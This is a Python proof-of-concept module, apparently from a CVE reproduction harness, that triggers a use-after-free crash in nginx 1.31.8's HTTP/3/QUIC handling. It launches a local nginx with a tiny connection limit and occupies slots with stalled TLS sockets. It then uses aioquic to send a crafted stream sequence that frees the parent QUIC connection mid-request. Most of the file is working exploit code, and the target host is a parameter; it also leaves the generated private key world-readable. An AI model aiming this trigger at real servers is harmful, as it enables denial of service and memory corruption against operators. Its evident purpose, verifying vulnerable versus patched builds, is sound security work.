#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-121810 : HTTP/3 (QUIC) ストリーム生成中の drain による親接続 UAF
========================================================================

nginx 1.31.8 の ngx_quic_create_stream() は、新しいストリームを rbtree へ
挿入する前に ngx_get_connection() を呼ぶ。空き接続が尽きている状態では
ngx_get_connection() が ngx_drain_connections() を呼び、reusable キューに
ある接続（この場合は同じ親 QUIC 接続上の「ヘッダ待ちのアイドルストリーム」）
を閉じる。そのストリームの送受信が既に完了していると
ngx_quic_close_stream() → ngx_quic_can_shutdown() が走るが、生成中の新規
ストリームはまだ rbtree に無いため「他に非キャンセル可能ストリーム無し」
と判定され、親 QUIC 接続が誤って reusable キューへ戻される。

その後、新規ストリーム上で proxy_pass のリクエストが処理され、
upstream 接続取得の ngx_get_connection() が再び drain を実行すると、
reusable キューの先頭に残っていた親 QUIC 接続が選ばれて close され、
進行中のリクエスト（と upstream 構造体）が解放される。これが
ngx_event_connect_peer() に戻った後の use-after-free になる。

1.31.9 では rbtree への挿入が ngx_get_connection() より前に移動され、
drain 中の can_shutdown が生成中ストリームを認識するため、親接続は
reusable キューへ戻されずクラッシュしない。

本モジュールは自己完結で動作する:
  * 自前の nginx.conf / 自己署名証明書を workdir 配下に生成
  * QUIC/UDP 18446 で listen、フォールバック用 TCP TLS 18447 は
    接続スロットを埋めるダミー接続と proxy_pass 先に使用
  * aioquic で QUIC 接続を 1 本張り、アイドルストリーム 0x0 を
    STOP_SENDING で生成 → RESET_RESTREAM の ACK を待つ →
    「stream 0x0 の FIN」と「stream 0x4 の完全な H3 リクエスト」を
    同一 UDP データグラムに載せて送信する
  * worker_connections を 16 に絞り、ダミー TCP/TLS 接続で空きを 1 個に
    しておくことで、stream 0x4 生成時の drain を確実に発生させる
  * error_log の "worker process N exited on signal 11" で CRASH 判定

使い方:
    import importlib.util, json
    spec = importlib.util.spec_from_file_location("m", "modules/121810.py")
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
    print(json.dumps(m.run("/path/to/sbin/nginx", "/path/to/workdir"), ensure_ascii=False, indent=2))

依存: Python 3.8+ / aioquic (未導入なら pip install aioquic)
"""

from __future__ import annotations

import asyncio
import json
import os
import re
import shutil
import signal
import socket
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

CVE = "CVE-2026-121810"

QUIC_PORT = 18446          # 専有 QUIC/UDP ポート
TCP_PORT = 18447           # フォールバック用 TCP(TLS) ポート
WORKER_CONNECTIONS = 16    # 8〜32 の小さめの値

# 接続スロットを埋めるダミー接続数。値は空きスロット数に直結する。
# 16 - (listener 2 + QUIC 親 1 + client uni 1 + server uni 3 + アイドル stream 1)
# = 8 が「stream 0x0 生成直後に空き 0」となる既定値。
HOLD_CANDIDATES = [8, 9, 7, 8, 10, 6, 11, 5]

CRASH_RE = re.compile(r"worker process (\d+) exited on signal (\d+)")
SIGNAL_RE = re.compile(r"exited on signal (\d+)")


# --------------------------------------------------------------------------
# 補助
# --------------------------------------------------------------------------
def _log(msg: str) -> None:
    print("[121810] %s" % msg, file=sys.stderr, flush=True)


def _read(path: Path) -> str:
    try:
        return path.read_text(errors="replace")
    except OSError:
        return ""


def _wait_for(pred, timeout: float, interval: float = 0.05) -> bool:
    end = time.time() + timeout
    while time.time() < end:
        if pred():
            return True
        time.sleep(interval)
    return pred()


def _nginx_version(binary: str) -> str:
    try:
        r = subprocess.run([binary, "-V"], capture_output=True, text=True, timeout=20)
        text = (r.stderr or "") + (r.stdout or "")
    except Exception:
        return ""
    m = re.search(r"nginx version:\s*(\S+)", text)
    if not m:
        return ""
    return m.group(1)


def _has_http3(binary: str) -> bool:
    try:
        r = subprocess.run([binary, "-V"], capture_output=True, text=True, timeout=20)
        text = (r.stderr or "") + (r.stdout or "")
    except Exception:
        return False
    return "--with-http_v3_module" in text


def _ensure_aioquic() -> bool:
    try:
        import aioquic  # noqa: F401
        return True
    except ImportError:
        pass
    _log("aioquic が見つからないため pip install aioquic を実行します")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "aioquic"],
                       check=True, timeout=300)
    except Exception as exc:  # pragma: no cover
        _log("pip install aioquic 失敗: %r" % (exc,))
        return False
    try:
        import aioquic  # noqa: F401
        return True
    except ImportError:
        return False


def _prepare_dirs(rt: Path) -> None:
    for sub in ("certs", "logs", "tmp", "html"):
        (rt / sub).mkdir(parents=True, exist_ok=True)
    (rt / "html" / "index.html").write_text("ok\n")


def _make_cert(rt: Path) -> None:
    cert = rt / "certs" / "cert.pem"
    key = rt / "certs" / "key.pem"
    if cert.exists() and key.exists():
        os.chmod(cert, 0o644)
        os.chmod(key, 0o644)
        return
    subprocess.run(
        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "2",
         "-keyout", str(key), "-out", str(cert),
         "-subj", "/CN=localhost",
         "-addext", "subjectAltName=DNS:localhost,IP:127.0.0.1"],
        check=True, capture_output=True,
    )
    # 指示どおり証明書・鍵は chmod 644
    os.chmod(cert, 0o644)
    os.chmod(key, 0o644)


def _write_conf(rt: Path, host: str) -> Path:
    cert = rt / "certs" / "cert.pem"
    key = rt / "certs" / "key.pem"
    conf = rt / "nginx.conf"
    conf.write_text(
        "worker_processes 1;\n"
        "daemon on;\n"
        "pid %(rt)s/nginx.pid;\n"
        "error_log %(rt)s/logs/error.log debug;\n"
        "events { worker_connections %(wc)d; }\n"
        "http {\n"
        "    access_log off;\n"
        "    client_body_temp_path %(rt)s/tmp;\n"
        "    ssl_certificate %(cert)s;\n"
        "    ssl_certificate_key %(key)s;\n"
        "    server {\n"
        "        listen %(host)s:%(tcpport)d ssl;\n"
        "        listen %(host)s:%(quicport)d quic reuseport;\n"
        "        http3 on;\n"
        "        location / {\n"
        "            proxy_pass http://%(host)s:%(tcpport)d;\n"
        "        }\n"
        "    }\n"
        "}\n" % {
            "rt": rt, "wc": WORKER_CONNECTIONS, "cert": cert, "key": key,
            "host": host, "tcpport": TCP_PORT, "quicport": QUIC_PORT,
        }
    )
    return conf


def _proc_alive(pid: int) -> bool:
    if pid <= 0:
        return False
    try:
        os.kill(pid, 0)
    except OSError:
        return False
    return os.path.exists("/proc/%d" % pid)


def _scan_procs(rt: Path, binary: str) -> List[int]:
    """起動した nginx (master/worker) を /proc 走査で見つける (pkill は使わない)。

    worker の cmdline は "nginx: worker process" に書き換えられ -p が見えないため、
    /proc/<pid>/cwd が workdir と一致する場合も対象にする。
    """
    pids: List[int] = []
    rt_s = str(rt)
    try:
        names = os.listdir("/proc")
    except OSError:
        return pids
    for name in names:
        if not name.isdigit():
            continue
        if int(name) == os.getpid():
            # full-poc.py を --local-bin <path> で実行すると、ハーネス自身の
            # cmdline にバイナリパスが含まれ（binary in cmd）、自分自身へ
            # SIGQUIT を送って終了してしまうため自分は対象外とする。
            continue
        try:
            cmd = Path("/proc/%s/cmdline" % name).read_bytes().decode(errors="replace")
        except OSError:
            continue
        if "nginx" not in cmd:
            continue
        match = rt_s in cmd or binary in cmd
        if not match:
            try:
                cwd = os.readlink("/proc/%s/cwd" % name)
            except OSError:
                cwd = ""
            match = cwd == rt_s
        if match:
            pids.append(int(name))
    return pids


def _stop_nginx(rt: Path, binary: str, grace: float = 3.0) -> None:
    """pid ファイル + /proc 走査で停止する。"""
    pid_file = rt / "nginx.pid"
    pid: Optional[int] = None
    if pid_file.exists():
        try:
            pid = int(pid_file.read_text().strip())
        except ValueError:
            pid = None
    if pid and _proc_alive(pid):
        try:
            os.kill(pid, signal.SIGQUIT)
        except OSError:
            pass

    end = time.time() + grace
    while time.time() < end:
        alive = [p for p in _scan_procs(rt, binary) if _proc_alive(p)]
        if not alive:
            return
        time.sleep(0.1)

    # 残っていれば個別に終了（pid ファイル + /proc 走査の範囲内）
    for p in _scan_procs(rt, binary):
        if not _proc_alive(p):
            continue
        for sig in (signal.SIGQUIT, signal.SIGTERM, signal.SIGKILL):
            try:
                os.kill(p, sig)
            except OSError:
                break
            time.sleep(0.1)
            if not _proc_alive(p):
                break
    try:
        pid_file.unlink()
    except OSError:
        pass


# --------------------------------------------------------------------------
# HTTP/3 クライアント (aioquic)
# --------------------------------------------------------------------------
def _qpack_varint(n: int) -> bytes:
    # 7bit prefix の varint（値は 126 未満を想定）
    return bytes([n & 0x7F])


def _headers_block(authority: bytes = b"localhost") -> bytes:
    """静的テーブルのみを使う QPACK ヘッダブロック。

    :method GET (static 17), :scheme https (static 23), :path / (static 1),
    :authority は Literal Field Line With Name Reference (static 0) を使う。
    """
    b = bytearray(b"\x00\x00")  # Required Insert Count 0 / Delta Base 0
    b += bytes([0xC0 | 17])     # :method GET
    b += bytes([0xC0 | 23])     # :scheme https
    b += bytes([0xC0 | 1])      # :path /
    b += bytes([0x50]) + _qpack_varint(len(authority)) + authority
    return bytes(b)


def _h3_request_payload(authority: bytes = b"localhost") -> bytes:
    block = _headers_block(authority)
    # H3 HEADERS frame (type 0x01) + length + QPACK block
    return b"\x01" + _qpack_varint(len(block)) + block


def _open_holders(host: str, n: int) -> List[socket.socket]:
    """TCP/TLS 18447 へ接続し、ClientHello の 1 バイト目だけで止める。

    nginx は最初の 1 バイトが 0x16 なら TLS ハンドシェイクへ入り、
    reusable キューから外れた「空きスロットを占有するだけの接続」になる。
    """
    socks: List[socket.socket] = []
    for _ in range(n):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        try:
            s.connect((host, TCP_PORT))
            s.sendall(b"\x16")
        except OSError:
            try:
                s.close()
            except OSError:
                pass
            break
        socks.append(s)
    return socks


class _QConfig:
    """aioquic の QuicConfiguration を遅延 import して組み立てるラッパ。"""

    @staticmethod
    def build():
        from aioquic.quic.configuration import QuicConfiguration
        from aioquic.h3.connection import H3_ALPN
        import ssl as _ssl
        cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
        cfg.verify_mode = _ssl.CERT_NONE
        return cfg


async def _run_scenario(host: str, hold: int, log_path: Path, ready_timeout: float = 8.0) -> Dict[str, object]:
    """1 回分のトリガシナリオ。戻り値は観測結果。"""
    from aioquic.asyncio.client import connect

    holders: List[socket.socket] = []
    result: Dict[str, object] = {"handshake": False, "z_created": False, "drain": False,
                                 "requeue": False, "holders": 0, "error": ""}
    loop = asyncio.get_event_loop()

    # aioquic の終了時ノイズ (StreamStateError) を抑制
    old_hook = getattr(sys, "unraisablehook", None)

    def _hook(unraisable):
        try:
            from aioquic.quic.exceptions import StreamStateError
            if isinstance(unraisable.exc_value, StreamStateError):
                return
        except Exception:
            pass
        if old_hook:
            old_hook(unraisable)

    if hasattr(sys, "unraisablehook"):
        sys.unraisablehook = _hook

    try:
        cfg = _QConfig.build()
        async with connect(host, QUIC_PORT, configuration=cfg,
                           wait_connected=True, local_port=0) as client:
            await client.wait_connected()
            result["handshake"] = True
            q = client._quic

            # client 制御用 uni stream (0x2) 等の初期化が済むまで待つ
            await asyncio.sleep(0.8)

            # 接続スロットを埋める (QUIC より後の reusable キュー先頭側に置かない)
            holders = _open_holders(host, hold)
            result["holders"] = len(holders)
            # nginx 側で TLS ハンドシェイク待ちとして受理された数を確認
            _wait_for(lambda: _read(log_path).count("http check ssl handshake") >= len(holders),
                      timeout=ready_timeout)
            await asyncio.sleep(0.25)

            # --- アイドル ストリーム 0x0 を STOP_SENDING で生成 ---
            # ローカルに stream 0x0 を作る (フレームは出ない)
            q.send_stream_data(0, b"", end_stream=False)
            q.stop_stream(0, 0)
            client.transmit()
            _wait_for(lambda: "quic stream id:0x0 create" in _read(log_path), timeout=3.0)
            # nginx が RESET_STREAM を送り、こちらが ACK するまで待つ
            await asyncio.sleep(0.5)
            log = _read(log_path)
            result["z_created"] = "quic stream id:0x0 create" in log

            # --- 同一データグラム: stream 0x0 の FIN → 新規 stream 0x4 の H3 リクエスト ---
            q.send_stream_data(0, b"", end_stream=True)
            yid = 4
            q.send_stream_data(yid, _h3_request_payload(), end_stream=True)
            client.transmit()

            # drain が走り、stream 0x0 が close されるのを待つ
            _wait_for(lambda: "quic stream id:0x0 close" in _read(log_path), timeout=3.0)
            await asyncio.sleep(0.8)
            log = _read(log_path)
            result["drain"] = "reusing connections" in log
            # 生成中に親 *1 が reusable へ戻されたか（脆弱版の証拠）
            result["requeue"] = bool(re.search(
                r"quic stream id:0x4 create[\s\S]{0,4000}?\*1 reusable connection: 1", log))
    except Exception as exc:  # noqa: BLE001
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    finally:
        for s in holders:
            try:
                s.close()
            except OSError:
                pass
        if hasattr(sys, "unraisablehook"):
            if old_hook is not None:
                sys.unraisablehook = old_hook
            else:
                try:
                    del sys.unraisablehook
                except AttributeError:
                    pass
    return result


# --------------------------------------------------------------------------
# 1 試行
# --------------------------------------------------------------------------
def _attempt(binary: str, rt: Path, host: str, hold: int, idx: int, log_path: Path) -> Dict[str, object]:
    # ログを毎回クリア（前回の crash 行を混ぜない）
    try:
        log_path.write_text("")
    except OSError:
        pass

    conf = rt / "nginx.conf"
    chk = subprocess.run([binary, "-t", "-p", str(rt) + "/", "-c", str(conf)],
                         capture_output=True, text=True)
    if chk.returncode != 0:
        return {"ok": False, "stage": "config", "stderr": (chk.stderr or chk.stdout)[-2000:]}

    start = None
    for _try in range(5):
        _stop_nginx(rt, binary, grace=1.0)
        start = subprocess.run([binary, "-p", str(rt) + "/", "-c", str(conf)],
                               capture_output=True, text=True)
        if start.returncode == 0:
            break
        # 直前の停止や TIME_WAIT による bind 失敗は少し待って再試行
        time.sleep(0.6)
    if start is None or start.returncode != 0:
        return {"ok": False, "stage": "start", "stderr": (start.stderr or start.stdout)[-2000:] if start else ""}

    started = _wait_for(lambda: (rt / "nginx.pid").exists() and _proc_alive(_pid_of(rt)),
                        timeout=5.0)
    if not started:
        return {"ok": False, "stage": "start", "stderr": "pid file が現れない"}

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            obs = loop.run_until_complete(
                asyncio.wait_for(_run_scenario(host, hold, log_path), timeout=25.0))
        finally:
            loop.close()
    except Exception as exc:  # noqa: BLE001
        obs = {"handshake": False, "error": "%s: %s" % (type(exc).__name__, exc)}

    # クラッシュ判定（worker が落ちるのを少し待つ）
    time.sleep(0.4)
    log = _read(log_path)
    crash_lines = [m.group(0) for m in CRASH_RE.finditer(log)]
    if not crash_lines:
        crash_lines = ["signal %s で終了" % m.group(1)
                       for m in SIGNAL_RE.finditer(log)]

    _stop_nginx(rt, binary)
    # SIGQUIT の正常終了ログが混ざらないよう、停止後に crash 行だけ再確認
    log = _read(log_path)
    if not crash_lines:
        crash_lines = [m.group(0) for m in CRASH_RE.finditer(log)]
    signals = [int(m.group(1)) for m in SIGNAL_RE.finditer(log)]

    return {
        "ok": True,
        "hold": hold,
        "obs": obs,
        "crash": bool([s for s in signals if s in (4, 6, 7, 8, 11)]),
        "signals": signals,
        "crash_lines": crash_lines[-3:],
        "requeue": bool(obs.get("requeue")),
        "drain": bool(obs.get("drain")),
        "log": log,
    }


def _pid_of(rt: Path) -> int:
    try:
        return int((rt / "nginx.pid").read_text().strip())
    except Exception:
        return -1


# --------------------------------------------------------------------------
# 公開 API
# --------------------------------------------------------------------------
def run(binary: str, workdir: str, host: str = "127.0.0.1", attempts: int = 4) -> Dict[str, object]:
    """CVE-2026-121810 の再現を 1 回実行し、結果を返す。

    Parameters
    ----------
    binary : str
        テスト対象の nginx 実行ファイル (sbin/nginx)。
    workdir : str
        nginx.conf / 証明書 / ログを置く作業ディレクトリ。
    host : str
        listen / 接続先ホスト（既定 127.0.0.1）。
    attempts : int
        接続スロット調整のための最大試行回数。

    Returns
    -------
    dict
        {"cve","configured","trigger","effect","detail"}
        effect: UAF / CRASH / TRIGGERED / ERROR / SKIP
    """
    res: Dict[str, object] = {
        "cve": CVE, "configured": False, "trigger": False,
        "effect": "ERROR", "detail": "",
    }
    details: List[str] = []

    binary_abs = os.path.abspath(binary)
    if not (os.path.isfile(binary_abs) and os.access(binary_abs, os.X_OK)):
        res.update(effect="SKIP", detail="nginx 実行ファイルが見つからない: %s" % binary_abs)
        return res

    ver = _nginx_version(binary_abs)
    if not _has_http3(binary_abs):
        res.update(effect="SKIP",
                   detail="%s は --with-http_v3_module 付きでビルドされていない (HTTP/3 不可)" % (ver or binary_abs))
        return res

    if not _ensure_aioquic():
        res.update(effect="SKIP", detail="aioquic を導入できないため HTTP/3 クライアントを実行できない")
        return res

    rt = Path(os.path.abspath(workdir))
    try:
        _prepare_dirs(rt)
        _make_cert(rt)
        _write_conf(rt, host)
    except Exception as exc:  # noqa: BLE001
        res.update(effect="ERROR", detail="設定/証明書の生成に失敗: %r" % (exc,))
        return res

    log_path = rt / "logs" / "error.log"

    # 過去のプロセスが残っていれば先に止める
    _stop_nginx(rt, binary_abs)

    chosen: Optional[Dict[str, object]] = None
    last_good: Optional[Dict[str, object]] = None
    no_crash_drain = 0
    executed: List[str] = []

    for i in range(max(1, attempts)):
        hold = HOLD_CANDIDATES[i % len(HOLD_CANDIDATES)]
        _log("attempt %d: worker_connections=%d hold=%d binary=%s (%s)"
             % (i + 1, WORKER_CONNECTIONS, hold, binary_abs, ver or "?"))
        try:
            r = _attempt(binary_abs, rt, host, hold, i, log_path)
        except Exception as exc:  # noqa: BLE001
            details.append("attempt %d: 例外 %r" % (i + 1, exc))
            _stop_nginx(rt, binary_abs)
            continue

        # 試行ログを退避
        try:
            (rt / "logs" / ("attempt-%d.log" % (i + 1))).write_text(_read(log_path))
        except OSError:
            pass

        if not r.get("ok"):
            details.append("attempt %d: 起動/設定失敗 (%s): %s"
                           % (i + 1, r.get("stage"), str(r.get("stderr", ""))[:400]))
            continue

        obs = r.get("obs") or {}
        executed.append("attempt %d: hold=%d handshake=%s z=%s drain=%s requeue=%s crash=%s"
                        % (i + 1, hold, obs.get("handshake"), obs.get("z_created"),
                           r.get("drain"), r.get("requeue"), r.get("crash")))
        details.extend(executed[-1:])

        if r.get("crash"):
            chosen = r
            break

        if r.get("drain"):
            # drain は走ったが落ちない → 修正版の挙動。同じ条件でもう一度だけ確認する
            last_good = r
            no_crash_drain += 1
            if no_crash_drain >= 2:
                chosen = r
                break
        # drain が走らなかった場合はスロット数が合っていないので次の HOLD を試す

    if chosen is None:
        if last_good is not None:
            # 2 回目の確認が起動失敗等で取れなくても、drain 観測済みなら修正版と判断
            chosen = last_good
        else:
            # クラッシュも drain も観測できなかった
            res.update(configured=True, trigger=False, effect="ERROR",
                       detail="再現経路に到達できなかった。\n" + "\n".join(details))
            return res

    log = str(chosen.get("log") or "")
    obs = chosen.get("obs") or {}
    res["configured"] = True

    requeue_ctx = ""
    m = re.search(r"quic stream id:0x4 create[\s\S]{0,4000}?(\*1 reusable connection: 1)", log)
    if m:
        requeue_ctx = m.group(1)

    crash_lines = chosen.get("crash_lines") or []
    signals = chosen.get("signals") or []

    if chosen.get("crash"):
        first_sig = next((s for s in signals if s in (4, 6, 7, 8, 11)), 11)
        res["trigger"] = True
        res["effect"] = "CRASH"
        detail = [
            "%s でクラッシュを再現した。" % (ver or "nginx"),
            "error_log 原文: %s" % (crash_lines[-1] if crash_lines else "signal %d" % first_sig),
            "生成中の stream 0x4 の ngx_get_connection() 内 drain で、親 QUIC 接続 (*1) が "
            "reusable キューへ誤って戻されることを確認: %s" % (requeue_ctx or "*1 reusable connection: 1"),
            "直後の proxy_pass upstream 接続取得時の drain が親 *1 を選び、close により "
            "進行中リクエストのメモリが解放されて use-after-free となる。",
            "試行: " + " / ".join(executed),
            "ログ: %s" % (rt / "logs" / "error.log"),
        ]
        res["detail"] = "\n".join(detail)
        return res

    # クラッシュしない = 修正版の挙動
    res["trigger"] = True
    res["effect"] = "TRIGGERED"
    detail = [
        "%s では同一シナリオで signal 11 が発生しなかった（修正版の挙動）。" % (ver or "nginx"),
        "drain は発生している: \"worker_connections are not enough, reusing connections\"",
        "1.31.9 では rbtree 挿入が ngx_get_connection() より前に移動したため、"
        "生成中ストリームが can_shutdown に認識され、親 QUIC 接続は reusable キューへ戻らない。"
        "その結果、後続の upstream 接続取得時にも親は選ばれず、リクエストが解放されない。",
        "試行: " + " / ".join(executed),
        "ログ: %s" % (rt / "logs" / "error.log"),
    ]
    res["detail"] = "\n".join(detail)
    return res


def main(argv: List[str]) -> int:
    if len(argv) < 2:
        print("usage: 121810.py <path/to/nginx> [workdir] [host]", file=sys.stderr)
        return 2
    binary = argv[1]
    workdir = argv[2] if len(argv) > 2 else os.getcwd()
    host = argv[3] if len(argv) > 3 else "127.0.0.1"
    out = run(binary, workdir, host)
    print(json.dumps(out, ensure_ascii=False, indent=2))
    return 0 if out.get("effect") in ("CRASH", "TRIGGERED") else 1


if __name__ == "__main__":
    sys.exit(main(sys.argv))
